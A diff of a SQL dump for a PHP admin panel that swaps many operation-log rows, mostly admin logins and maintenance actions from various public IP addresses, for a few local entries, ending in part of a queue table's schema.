-INSERT INTO `system_oplog` VALUES (5642, 'admin/login/index', '114.47.120.131', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 20:03:26');
-INSERT INTO `system_oplog` VALUES (5643, 'admin/login/index', '120.239.219.97', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 20:03:38');
-INSERT INTO `system_oplog` VALUES (5644, 'admin/login/index', '219.135.62.186', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 20:05:34');
-INSERT INTO `system_oplog` VALUES (5645, 'admin/login/index', '118.117.56.155', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 20:15:23');
-INSERT INTO `system_oplog` VALUES (5646, 'admin/login/index', '125.85.44.33', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 20:26:42');
-INSERT INTO `system_oplog` VALUES (5647, 'admin/login/index', '222.66.149.90', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 20:34:10');
-INSERT INTO `system_oplog` VALUES (5648, 'admin/login/index', '183.195.12.139', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 20:34:19');
-INSERT INTO `system_oplog` VALUES (5649, 'admin/login/index', '183.202.216.111', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:02:03');
-INSERT INTO `system_oplog` VALUES (5650, 'admin/login/index', '113.246.106.21', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:08:31');
-INSERT INTO `system_oplog` VALUES (5651, 'admin/login/index', '114.96.9.103', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:10:31');
-INSERT INTO `system_oplog` VALUES (5652, 'admin/login/index', '121.237.173.198', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:11:25');
-INSERT INTO `system_oplog` VALUES (5653, 'admin/login/index', '114.96.157.100', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:16:10');
-INSERT INTO `system_oplog` VALUES (5654, 'admin/login/index', '14.121.158.89', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:28:26');
-INSERT INTO `system_oplog` VALUES (5655, 'admin/api.plugs/clearruntime', '14.121.158.89', '系统运维管理', '清理网站日志及缓存数据', 'admin', '2021-02-23 21:34:35');
-INSERT INTO `system_oplog` VALUES (5656, 'admin/api.plugs/pushruntime', '14.121.158.89', '系统运维管理', '刷新并创建网站路由缓存', 'admin', '2021-02-23 21:34:56');
-INSERT INTO `system_oplog` VALUES (5657, 'admin/login/index', '27.27.193.70', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:49:04');
-INSERT INTO `system_oplog` VALUES (5658, 'admin/login/index', '183.178.28.238', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:49:08');
-INSERT INTO `system_oplog` VALUES (5659, 'admin/login/index', '182.119.214.140', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 21:51:37');
-INSERT INTO `system_oplog` VALUES (5660, 'admin/login/index', '120.239.219.97', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 22:26:17');
-INSERT INTO `system_oplog` VALUES (5661, 'admin/login/index', '106.193.212.64', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 22:33:41');
-INSERT INTO `system_oplog` VALUES (5662, 'admin/login/index', '61.159.121.210', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 22:41:05');
-INSERT INTO `system_oplog` VALUES (5663, 'admin/login/index', '1.86.247.242', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 22:48:25');
-INSERT INTO `system_oplog` VALUES (5664, 'admin/login/index', '121.32.51.247', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-23 23:56:13');
-INSERT INTO `system_oplog` VALUES (5665, 'admin/login/index', '14.157.56.41', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 00:18:37');
-INSERT INTO `system_oplog` VALUES (5666, 'admin/login/index', '125.68.92.243', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 00:50:41');
-INSERT INTO `system_oplog` VALUES (5667, 'admin/api.plugs/debug', '125.68.92.243', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 00:51:04');
-INSERT INTO `system_oplog` VALUES (5668, 'admin/login/index', '27.157.82.41', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 01:06:53');
-INSERT INTO `system_oplog` VALUES (5669, 'admin/login/index', '27.153.4.22', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 02:52:35');
-INSERT INTO `system_oplog` VALUES (5670, 'admin/login/index', '117.100.176.13', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 08:29:26');
-INSERT INTO `system_oplog` VALUES (5671, 'admin/login/index', '218.3.40.194', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 08:42:23');
-INSERT INTO `system_oplog` VALUES (5672, 'admin/login/index', '111.26.70.124', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 08:59:07');
-INSERT INTO `system_oplog` VALUES (5673, 'admin/login/index', '118.117.56.155', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:06:55');
-INSERT INTO `system_oplog` VALUES (5674, 'admin/login/index', '47.242.81.19', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:07:13');
-INSERT INTO `system_oplog` VALUES (5675, 'admin/auth/state', '118.117.56.155', '系统权限管理', '禁用系统权限[13]成功', 'admin', '2021-02-24 09:07:34');
-INSERT INTO `system_oplog` VALUES (5676, 'admin/auth/state', '118.117.56.155', '系统权限管理', '激活系统权限[13]成功', 'admin', '2021-02-24 09:07:41');
-INSERT INTO `system_oplog` VALUES (5677, 'admin/login/index', '111.203.91.97', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:14:02');
-INSERT INTO `system_oplog` VALUES (5678, 'admin/login/index', '111.207.82.114', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:14:47');
-INSERT INTO `system_oplog` VALUES (5679, 'admin/login/index', '117.62.198.60', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:21:29');
-INSERT INTO `system_oplog` VALUES (5680, 'admin/login/index', '121.8.142.178', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:23:16');
-INSERT INTO `system_oplog` VALUES (5681, 'admin/login/index', '121.69.47.30', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:27:20');
-INSERT INTO `system_oplog` VALUES (5682, 'admin/login/index', '114.219.22.252', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:34:06');
-INSERT INTO `system_oplog` VALUES (5683, 'admin/login/index', '103.76.60.61', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:36:18');
-INSERT INTO `system_oplog` VALUES (5684, 'admin/login/index', '119.123.79.229', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:42:43');
-INSERT INTO `system_oplog` VALUES (5685, 'admin/login/index', '49.65.2.50', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:49:53');
-INSERT INTO `system_oplog` VALUES (5686, 'admin/login/index', '111.172.5.135', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:51:47');
-INSERT INTO `system_oplog` VALUES (5687, 'admin/login/index', '139.226.186.249', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 09:54:14');
-INSERT INTO `system_oplog` VALUES (5688, 'admin/login/index', '106.118.137.30', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:09:34');
-INSERT INTO `system_oplog` VALUES (5689, 'admin/api.plugs/debug', '106.118.137.30', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 10:10:19');
-INSERT INTO `system_oplog` VALUES (5690, 'admin/api.plugs/debug', '106.118.137.30', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 10:10:23');
-INSERT INTO `system_oplog` VALUES (5691, 'admin/login/index', '18.166.72.14', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:13:03');
-INSERT INTO `system_oplog` VALUES (5692, 'admin/login/index', '118.119.176.36', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:14:47');
-INSERT INTO `system_oplog` VALUES (5693, 'admin/login/index', '59.47.50.162', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:15:35');
-INSERT INTO `system_oplog` VALUES (5694, 'admin/login/index', '117.22.81.199', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:19:10');
-INSERT INTO `system_oplog` VALUES (5695, 'admin/login/index', '27.27.193.70', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:19:54');
-INSERT INTO `system_oplog` VALUES (5696, 'admin/api.plugs/debug', '59.47.50.162', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 10:21:24');
-INSERT INTO `system_oplog` VALUES (5697, 'admin/login/index', '221.237.158.197', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:23:11');
-INSERT INTO `system_oplog` VALUES (5698, 'admin/login/index', '113.109.82.93', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:27:36');
-INSERT INTO `system_oplog` VALUES (5699, 'admin/login/index', '112.36.142.186', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:33:05');
-INSERT INTO `system_oplog` VALUES (5700, 'admin/login/index', '106.114.151.16', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:36:45');
-INSERT INTO `system_oplog` VALUES (5701, 'admin/user/edit', '106.114.151.16', '系统用户管理', '修改系统用户[10000]成功', 'admin', '2021-02-24 10:38:04');
-INSERT INTO `system_oplog` VALUES (5702, 'admin/api.plugs/pushruntime', '106.114.151.16', '系统运维管理', '刷新并创建网站路由缓存', 'admin', '2021-02-24 10:38:30');
-INSERT INTO `system_oplog` VALUES (5703, 'admin/api.plugs/clearruntime', '106.114.151.16', '系统运维管理', '清理网站日志及缓存数据', 'admin', '2021-02-24 10:38:34');
-INSERT INTO `system_oplog` VALUES (5704, 'admin/login/index', '112.36.142.186', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:38:40');
-INSERT INTO `system_oplog` VALUES (5705, 'admin/login/index', '124.65.158.242', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:41:36');
-INSERT INTO `system_oplog` VALUES (5706, 'admin/login/index', '113.122.237.20', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:49:22');
-INSERT INTO `system_oplog` VALUES (5707, 'admin/login/index', '61.52.129.43', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:54:27');
-INSERT INTO `system_oplog` VALUES (5708, 'admin/login/index', '222.90.76.116', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:55:04');
-INSERT INTO `system_oplog` VALUES (5709, 'admin/api.plugs/debug', '61.52.129.43', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 10:55:55');
-INSERT INTO `system_oplog` VALUES (5710, 'admin/login/index', '113.88.13.223', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 10:56:49');
-INSERT INTO `system_oplog` VALUES (5711, 'admin/login/index', '221.237.158.197', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:10:47');
-INSERT INTO `system_oplog` VALUES (5712, 'admin/login/index', '121.8.142.178', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:12:28');
-INSERT INTO `system_oplog` VALUES (5713, 'admin/login/index', '114.86.188.182', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:16:02');
-INSERT INTO `system_oplog` VALUES (5714, 'admin/login/index', '121.237.173.198', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:20:31');
-INSERT INTO `system_oplog` VALUES (5715, 'admin/login/index', '183.56.156.210', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:26:09');
-INSERT INTO `system_oplog` VALUES (5716, 'admin/login/index', '210.21.228.74', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:26:17');
-INSERT INTO `system_oplog` VALUES (5717, 'admin/login/index', '183.56.156.210', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:27:35');
-INSERT INTO `system_oplog` VALUES (5718, 'admin/login/index', '175.168.36.186', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:29:02');
-INSERT INTO `system_oplog` VALUES (5719, 'admin/login/index', '168.70.111.131', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:42:42');
-INSERT INTO `system_oplog` VALUES (5720, 'admin/api.plugs/optimize', '168.70.111.131', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-24 11:43:01');
-INSERT INTO `system_oplog` VALUES (5721, 'admin/login/index', '116.230.92.161', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:45:39');
-INSERT INTO `system_oplog` VALUES (5722, 'admin/login/index', '113.65.165.229', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:46:38');
-INSERT INTO `system_oplog` VALUES (5723, 'admin/login/index', '218.89.239.74', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:50:10');
-INSERT INTO `system_oplog` VALUES (5724, 'admin/login/index', '115.171.91.32', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:50:48');
-INSERT INTO `system_oplog` VALUES (5725, 'admin/login/index', '116.21.131.118', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:51:50');
-INSERT INTO `system_oplog` VALUES (5726, 'admin/login/index', '113.102.224.162', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:53:21');
-INSERT INTO `system_oplog` VALUES (5727, 'admin/login/index', '218.69.11.110', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:53:47');
-INSERT INTO `system_oplog` VALUES (5728, 'admin/login/index', '58.246.201.150', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 11:53:49');
-INSERT INTO `system_oplog` VALUES (5729, 'admin/login/index', '220.172.81.255', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 12:01:21');
-INSERT INTO `system_oplog` VALUES (5730, 'admin/login/index', '117.22.81.199', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 12:04:03');
-INSERT INTO `system_oplog` VALUES (5731, 'admin/login/index', '202.113.10.150', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 12:15:32');
-INSERT INTO `system_oplog` VALUES (5732, 'admin/login/index', '111.121.17.221', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 12:24:36');
-INSERT INTO `system_oplog` VALUES (5733, 'admin/login/index', '14.116.37.140', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 12:55:42');
-INSERT INTO `system_oplog` VALUES (5734, 'admin/login/index', '153.37.174.206', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:16:02');
-INSERT INTO `system_oplog` VALUES (5735, 'admin/login/index', '116.21.43.4', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:37:43');
-INSERT INTO `system_oplog` VALUES (5736, 'admin/api.plugs/clearconfig', '116.21.43.4', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-24 13:37:48');
-INSERT INTO `system_oplog` VALUES (5737, 'admin/api.plugs/clearconfig', '58.246.201.150', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-24 13:38:40');
-INSERT INTO `system_oplog` VALUES (5738, 'admin/api.plugs/clearruntime', '58.246.201.150', '系统运维管理', '清理网站日志及缓存数据', 'admin', '2021-02-24 13:38:44');
-INSERT INTO `system_oplog` VALUES (5739, 'admin/login/index', '116.21.43.4', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:38:56');
-INSERT INTO `system_oplog` VALUES (5740, 'admin/login/index', '123.168.85.233', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:40:47');
-INSERT INTO `system_oplog` VALUES (5741, 'admin/api.plugs/optimize', '58.246.201.150', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-24 13:47:46');
-INSERT INTO `system_oplog` VALUES (5742, 'admin/login/index', '220.202.233.79', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:48:05');
-INSERT INTO `system_oplog` VALUES (5743, 'admin/login/index', '58.57.167.158', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:48:44');
-INSERT INTO `system_oplog` VALUES (5744, 'admin/login/index', '113.70.120.50', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:51:07');
-INSERT INTO `system_oplog` VALUES (5745, 'admin/login/index', '106.122.210.125', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 13:51:26');
-INSERT INTO `system_oplog` VALUES (5746, 'admin/login/index', '219.136.198.209', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:00:05');
-INSERT INTO `system_oplog` VALUES (5747, 'admin/login/index', '125.42.213.21', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:00:20');
-INSERT INTO `system_oplog` VALUES (5748, 'admin/login/index', '117.62.198.60', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:00:42');
-INSERT INTO `system_oplog` VALUES (5749, 'admin/login/index', '223.104.103.65', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:04:36');
-INSERT INTO `system_oplog` VALUES (5750, 'admin/login/index', '60.220.238.142', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:11:44');
-INSERT INTO `system_oplog` VALUES (5751, 'admin/login/index', '118.113.243.97', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:18:54');
-INSERT INTO `system_oplog` VALUES (5752, 'admin/login/index', '221.210.48.82', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:19:17');
-INSERT INTO `system_oplog` VALUES (5753, 'admin/login/index', '114.86.188.182', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:25:17');
-INSERT INTO `system_oplog` VALUES (5754, 'admin/login/index', '180.137.0.188', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:32:40');
-INSERT INTO `system_oplog` VALUES (5755, 'admin/login/index', '111.207.166.93', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:33:44');
-INSERT INTO `system_oplog` VALUES (5756, 'admin/login/index', '1.202.190.29', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:38:24');
-INSERT INTO `system_oplog` VALUES (5757, 'admin/login/index', '27.152.242.211', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:40:06');
-INSERT INTO `system_oplog` VALUES (5758, 'admin/login/index', '119.39.19.84', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:47:23');
-INSERT INTO `system_oplog` VALUES (5759, 'admin/login/index', '113.88.13.223', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:48:21');
-INSERT INTO `system_oplog` VALUES (5760, 'admin/api.plugs/debug', '113.88.13.223', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 14:50:04');
-INSERT INTO `system_oplog` VALUES (5761, 'admin/api.plugs/debug', '113.88.13.223', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 14:50:11');
-INSERT INTO `system_oplog` VALUES (5762, 'admin/login/index', '222.212.15.91', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 14:54:19');
-INSERT INTO `system_oplog` VALUES (5765, 'admin/login/index', '118.113.4.56', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:05:42');
-INSERT INTO `system_oplog` VALUES (5766, 'admin/login/index', '140.206.38.58', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:09:37');
-INSERT INTO `system_oplog` VALUES (5767, 'admin/login/index', '1.192.244.166', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:16:14');
-INSERT INTO `system_oplog` VALUES (5768, 'wechat/fans/sync', '1.192.244.166', '微信授权配置', '创建粉丝用户同步任务', 'admin', '2021-02-24 15:16:47');
-INSERT INTO `system_oplog` VALUES (5769, 'admin/api.plugs/debug', '1.192.244.166', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 15:17:01');
-INSERT INTO `system_oplog` VALUES (5770, 'admin/api.plugs/debug', '1.192.244.166', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 15:17:04');
-INSERT INTO `system_oplog` VALUES (5771, 'admin/login/index', '59.42.74.62', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:25:42');
-INSERT INTO `system_oplog` VALUES (5772, 'admin/login/index', '223.223.193.130', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:28:29');
-INSERT INTO `system_oplog` VALUES (5773, 'admin/login/index', '112.32.77.245', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:33:13');
-INSERT INTO `system_oplog` VALUES (5774, 'admin/login/index', '111.60.232.222', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:40:14');
-INSERT INTO `system_oplog` VALUES (5775, 'admin/login/index', '144.0.157.27', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:45:56');
-INSERT INTO `system_oplog` VALUES (5776, 'admin/api.plugs/debug', '144.0.157.27', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 15:47:53');
-INSERT INTO `system_oplog` VALUES (5777, 'admin/api.plugs/debug', '144.0.157.27', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 15:47:57');
-INSERT INTO `system_oplog` VALUES (5778, 'admin/login/index', '221.234.18.141', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 15:53:06');
-INSERT INTO `system_oplog` VALUES (5779, 'admin/login/index', '61.188.18.118', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:01:34');
-INSERT INTO `system_oplog` VALUES (5780, 'admin/login/index', '160.16.74.189', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:20:58');
-INSERT INTO `system_oplog` VALUES (5781, 'admin/login/index', '116.21.43.4', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:25:50');
-INSERT INTO `system_oplog` VALUES (5782, 'admin/login/index', '222.212.170.33', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:30:06');
-INSERT INTO `system_oplog` VALUES (5783, 'admin/login/index', '220.162.46.184', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:32:25');
-INSERT INTO `system_oplog` VALUES (5784, 'admin/login/index', '116.11.196.157', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:47:01');
-INSERT INTO `system_oplog` VALUES (5785, 'admin/login/index', '182.148.15.157', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:48:56');
-INSERT INTO `system_oplog` VALUES (5786, 'admin/login/index', '171.217.92.119', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:54:33');
-INSERT INTO `system_oplog` VALUES (5787, 'admin/login/index', '116.21.43.4', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:54:47');
-INSERT INTO `system_oplog` VALUES (5788, 'admin/login/index', '180.140.163.60', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:58:03');
-INSERT INTO `system_oplog` VALUES (5789, 'admin/login/index', '180.140.163.60', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:58:10');
-INSERT INTO `system_oplog` VALUES (5790, 'admin/login/index', '139.205.19.65', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 16:59:04');
-INSERT INTO `system_oplog` VALUES (5791, 'admin/api.plugs/clearconfig', '171.217.92.119', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-24 17:06:42');
-INSERT INTO `system_oplog` VALUES (5792, 'admin/login/index', '117.62.198.60', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:08:36');
-INSERT INTO `system_oplog` VALUES (5793, 'admin/login/index', '183.195.18.45', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:13:34');
-INSERT INTO `system_oplog` VALUES (5794, 'admin/api.plugs/debug', '171.217.92.119', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 17:14:32');
-INSERT INTO `system_oplog` VALUES (5795, 'admin/api.plugs/debug', '171.217.92.119', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 17:14:34');
-INSERT INTO `system_oplog` VALUES (5796, 'admin/api.plugs/debug', '171.217.92.119', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 17:14:38');
-INSERT INTO `system_oplog` VALUES (5797, 'admin/login/index', '180.109.189.113', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:20:13');
-INSERT INTO `system_oplog` VALUES (5798, 'admin/login/index', '111.199.222.138', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:21:17');
-INSERT INTO `system_oplog` VALUES (5799, 'admin/api.plugs/clearconfig', '117.62.198.60', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-24 17:27:39');
-INSERT INTO `system_oplog` VALUES (5800, 'admin/api.plugs/clearconfig', '59.42.74.62', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-24 17:29:00');
-INSERT INTO `system_oplog` VALUES (5801, 'admin/login/index', '121.35.2.157', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:33:58');
-INSERT INTO `system_oplog` VALUES (5802, 'admin/api.plugs/clearconfig', '121.237.173.198', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-24 17:34:04');
-INSERT INTO `system_oplog` VALUES (5803, 'admin/login/index', '60.186.216.69', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:39:17');
-INSERT INTO `system_oplog` VALUES (5804, 'admin/login/index', '223.223.193.130', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:40:18');
-INSERT INTO `system_oplog` VALUES (5805, 'admin/login/index', '120.219.45.7', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:43:45');
-INSERT INTO `system_oplog` VALUES (5806, 'admin/login/index', '120.235.19.185', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:50:01');
-INSERT INTO `system_oplog` VALUES (5807, 'admin/api.plugs/debug', '117.62.198.60', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-24 17:51:09');
-INSERT INTO `system_oplog` VALUES (5808, 'admin/api.plugs/debug', '117.62.198.60', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-24 17:51:13');
-INSERT INTO `system_oplog` VALUES (5809, 'admin/login/index', '114.223.214.42', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:51:18');
-INSERT INTO `system_oplog` VALUES (5810, 'admin/login/index', '114.88.152.212', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:51:19');
-INSERT INTO `system_oplog` VALUES (5811, 'admin/api.plugs/clearconfig', '117.62.198.60', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-24 17:51:34');
-INSERT INTO `system_oplog` VALUES (5812, 'admin/api.plugs/optimize', '117.62.198.60', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-24 17:51:55');
-INSERT INTO `system_oplog` VALUES (5813, 'admin/api.plugs/optimize', '114.88.152.212', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-24 17:53:51');
-INSERT INTO `system_oplog` VALUES (5814, 'admin/api.plugs/optimize', '117.62.198.60', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-24 17:54:54');
-INSERT INTO `system_oplog` VALUES (5815, 'admin/login/index', '58.35.215.135', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 17:56:59');
+INSERT INTO `system_oplog` VALUES (1, 'admin/api.plugs/optimize', '127.0.0.1', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-23 09:21:43');
+INSERT INTO `system_oplog` VALUES (2, 'admin/api.queue/stop', '127.0.0.1', '系统运维管理', '尝试停止后台服务主进程', 'admin', '2021-02-23 09:21:54');
+INSERT INTO `system_oplog` VALUES (3, 'admin/login/index', '127.0.0.1', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-24 08:48:12');
+INSERT INTO `system_oplog` VALUES (4, 'admin/menu/add', '127.0.0.1', '系统菜单管理', '添加系统菜单[94]成功', 'admin', '2021-02-24 08:49:16');
+INSERT INTO `system_oplog` VALUES (5, 'admin/menu/remove', '127.0.0.1', '系统菜单管理', '删除系统菜单[86]成功', 'admin', '2021-02-24 09:18:29');
+INSERT INTO `system_oplog` VALUES (6, 'admin/menu/remove', '127.0.0.1', '系统菜单管理', '删除系统菜单[85]成功', 'admin', '2021-02-24 09:18:33');
+INSERT INTO `system_oplog` VALUES (7, 'admin/menu/edit', '127.0.0.1', '系统菜单管理', '修改系统菜单[71]成功', 'admin', '2021-02-24 09:23:18');
+INSERT INTO `system_oplog` VALUES (8, 'admin/menu/edit', '127.0.0.1', '系统菜单管理', '修改系统菜单[94]成功', 'admin', '2021-02-24 09:23:35');
+INSERT INTO `system_oplog` VALUES (9, 'admin/auth/add', '127.0.0.1', '系统权限管理', '添加系统权限[1]成功', 'admin', '2021-02-24 09:24:55');
+INSERT INTO `system_oplog` VALUES (10, 'admin/menu/edit', '127.0.0.1', '系统菜单管理', '修改系统菜单[94]成功', 'admin', '2021-02-24 09:32:05');
+INSERT INTO `system_oplog` VALUES (11, 'admin/menu/edit', '127.0.0.1', '系统菜单管理', '修改系统菜单[71]成功', 'admin', '2021-02-24 09:32:18');
 
 -- ----------------------------
 -- Table structure for system_queue
@@ -5774,37 +4790,12 @@ CREATE TABLE `system_queue`  (
   INDEX `idx_system_queue_rscript`(`rscript`) USING BTREE,
   INDEX `idx_system_queue_create_at`(`create_at`) USING BTREE,
